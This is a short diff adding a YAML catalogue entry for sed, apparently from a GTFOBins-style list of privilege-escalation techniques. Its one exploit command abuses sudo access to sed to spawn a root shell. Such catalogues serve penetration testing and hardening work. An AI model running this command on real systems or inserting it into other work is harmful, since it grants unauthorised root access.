@@ -1,0 +1,4 @@
+name: sed
+binary_path: /usr/bin/sed
+exploit_cmds:
+- sudo /usr/bin/sed -n '1e exec /bin/sh 1>&0' /etc/hosts
